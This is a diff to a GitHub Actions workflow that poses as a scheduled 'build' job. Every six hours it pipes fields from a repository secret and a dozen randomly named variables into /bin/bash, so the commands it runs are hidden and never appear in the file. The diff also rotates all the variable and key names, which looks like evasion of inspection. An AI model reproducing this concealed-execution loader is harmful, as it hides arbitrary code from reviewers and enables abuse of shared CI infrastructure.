@@ -3,21 +3,26 @@ name: weiqilang4891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-
+    - cron: '26 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weiqilang4891
         env:
-          ob67: ${{ secrets.ob67 }}
+          eqp1947: ${{ secrets.eqp1947 }}
         run: |
-          echo $ob67 | jq -r .dyj5703 | /bin/bash
-          echo $llgm442 | jq -r .ekac19331 | /bin/bash
-          echo $xi10 | jq -r .npsw7957 | /bin/bash
-          echo $tnlv205 | jq -r .bjrd0792 | /bin/bash
-          echo $u61 | jq -r .ngdj8 | /bin/bash
+          echo $eqp1947 | jq -r .p40 | /bin/bash
+          echo $e1101 | jq -r .g76 | /bin/bash
+          echo $kt772 | jq -r .i2814 | /bin/bash
+          echo $z87545 | jq -r .bg525 | /bin/bash
+          echo $bpvn55 | jq -r .kurh062 | /bin/bash
+          echo $irgwq8482 | jq -r .wy01 | /bin/bash
+          echo $ucacd81 | jq -r .vzz2287 | /bin/bash
+          echo $viimg3498 | jq -r .dbrvy3 | /bin/bash
+          echo $fczc59531 | jq -r .kwtx53461 | /bin/bash
+          echo $sdiy3 | jq -r .z60 | /bin/bash
+          echo $z87 | jq -r .e1 | /bin/bash
+          echo $v65806 | jq -r .atqo97678 | /bin/bash
 
